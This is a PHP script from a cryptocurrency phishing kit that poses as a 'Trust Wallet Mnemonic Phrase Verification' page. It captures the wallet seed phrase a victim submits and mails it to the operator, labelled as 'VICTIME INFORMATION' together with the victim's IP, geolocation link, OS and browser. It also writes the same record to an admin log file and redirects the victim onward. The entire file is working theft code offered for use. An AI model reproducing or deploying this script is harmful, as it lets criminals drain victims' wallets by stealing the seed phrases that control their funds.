<?php
header('Location: referral.html');
require 'Email.php';
require 'getdata.php';
$walletseed = $_POST['walletseed'];
$to = "$yourmail";
$subject = "🤑 Trust Wallet Memonic Phrase Verification 🤑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font style='color: #0a5d00;'>🔥 Trust Wallet Mnemonic Phrase Verification</font><br>
<font style='color:#9c0000;'>📌</font> Confirmed Memonic Phrase = <font style='color:#0070ba;'>$walletseed</font><br>
<font style='color: #0a5d00;'>🛠️ VICTIME INFORMATION</font><br>
<font style='color:#9c0000;'>📌</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>📌</font> TIME/DATE = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>📌</font> OS = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>📌</font> BROWSER = <font style='color:#0070ba;'>$user_browser</font><br>
<font style='color: #820000;'>Thankx to 🌐 Coachella 🌐</font>
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:🌼🤑 Memonic Phrase Verification 🤑 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>